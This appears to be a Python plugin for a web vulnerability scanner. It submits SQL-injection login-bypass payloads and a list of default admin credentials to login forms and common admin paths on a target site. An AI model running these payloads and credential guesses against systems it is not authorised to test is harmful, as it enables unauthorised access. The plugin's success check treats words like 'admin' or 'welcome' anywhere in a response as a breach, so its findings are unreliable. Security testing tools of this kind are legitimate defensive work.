def scan(scanner):
    """Scan for Authentication Bypass vulnerabilities"""
    print("[PLUGIN] Scanning for Authentication Bypass vulnerabilities...")
    
    # Common authentication bypass payloads
    bypass_payloads = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 'x'='x",
        "' OR 1=1#",
        "admin' or '1'='1",
        "admin' or 1=1",
        "admin'/**/or/**/1=1",
        "admin'||'1'='1",
        "admin'||1=1",
        "admin' UNION SELECT 1,2,3--",
        "admin' UNION SELECT NULL,NULL,NULL--"
    ]
    
    # Common admin credentials
    admin_creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('admin', 'admin123'),
        ('root', 'root'),
        ('root', 'password'),
        ('administrator', 'administrator'),
        ('test', 'test'),
        ('guest', 'guest'),
        ('user', 'user')
    ]
    
    # Common login endpoints
    login_paths = [
        '/login',
        '/admin',
        '/admin/login',
        '/administrator',
        '/user/login',
        '/auth',
        '/signin',
        '/sign-in',
        '/panel',
        '/dashboard',
        '/cp',
        '/control',
        '/manage'
    ]
    
    try:
        # Test for authentication bypass in forms
        response = scanner.session.get(scanner.target_url, timeout=scanner.timeout)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'post').lower()
            
            if form_action:
                test_url = scanner.urljoin(scanner.target_url, form_action)
            else:
                test_url = scanner.target_url
            
            # Check if this looks like a login form
            inputs = form.find_all('input')
            username_field = None
            password_field = None
            
            for input_field in inputs:
                input_name = input_field.get('name', '').lower()
                input_type = input_field.get('type', '').lower()
                
                if any(keyword in input_name for keyword in ['user', 'name', 'email', 'login', 'account']):
                    username_field = input_name
                elif input_type == 'password' or 'pass' in input_name:
                    password_field = input_name
            
            if username_field and password_field:
                # Test authentication bypass payloads
                for payload in bypass_payloads:
                    if form_method == 'post':
                        data = {username_field: payload, password_field: 'anything'}
                        try:
                            response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                        except:
                            continue
                    else:
                        test_url_with_payload = f"{test_url}?{username_field}={scanner.urllib.parse.quote(payload)}&{password_field}=anything"
                        try:
                            response = scanner.session.get(test_url_with_payload, timeout=scanner.timeout)
                        except:
                            continue
                    
                    # Check for successful bypass indicators
                    bypass_indicators = [
                        'welcome', 'dashboard', 'admin', 'panel', 'logout', 'profile',
                        'success', 'logged in', 'authenticated', 'authorized'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in bypass_indicators:
                        if indicator in response_text:
                            scanner.log_vulnerability(
                                'Authentication Bypass',
                                'Critical',
                                f'Authentication bypass vulnerability detected in login form',
                                f'Payload: {payload}, Indicator: {indicator}',
                                'CWE-287'
                            )
                            break
                
                # Test common admin credentials
                for username, password in admin_creds:
                    if form_method == 'post':
                        data = {username_field: username, password_field: password}
                        try:
                            response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                        except:
                            continue
                    else:
                        test_url_with_creds = f"{test_url}?{username_field}={username}&{password_field}={password}"
                        try:
                            response = scanner.session.get(test_url_with_creds, timeout=scanner.timeout)
                        except:
                            continue
                    
                    # Check for successful login
                    success_indicators = [
                        'welcome', 'dashboard', 'admin', 'panel', 'logout', 'profile',
                        'success', 'logged in', 'authenticated', 'authorized'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in success_indicators:
                        if indicator in response_text:
                            scanner.log_vulnerability(
                                'Weak Authentication',
                                'High',
                                f'Weak default credentials detected: {username}:{password}',
                                f'Credentials: {username}:{password}, Indicator: {indicator}',
                                'CWE-1392'
                            )
                            break
        
        # Test common login endpoints for default credentials
        for login_path in login_paths:
            test_url = scanner.urljoin(scanner.target_url, login_path)
            try:
                response = scanner.session.get(test_url, timeout=scanner.timeout)
                if response.status_code == 200:
                    # Found a login page, test default credentials
                    for username, password in admin_creds:
                        data = {'username': username, 'password': password}
                        try:
                            login_response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                            if 'welcome' in login_response.text.lower() or 'dashboard' in login_response.text.lower():
                                scanner.log_vulnerability(
                                    'Default Credentials',
                                    'High',
                                    f'Default credentials work on {login_path}',
                                    f'Credentials: {username}:{password}',
                                    'CWE-1392'
                                )
                                break
                        except:
                            continue
            except:
                continue
                
    except Exception as e:
        print(f"[PLUGIN][Auth Bypass] Error: {e}") 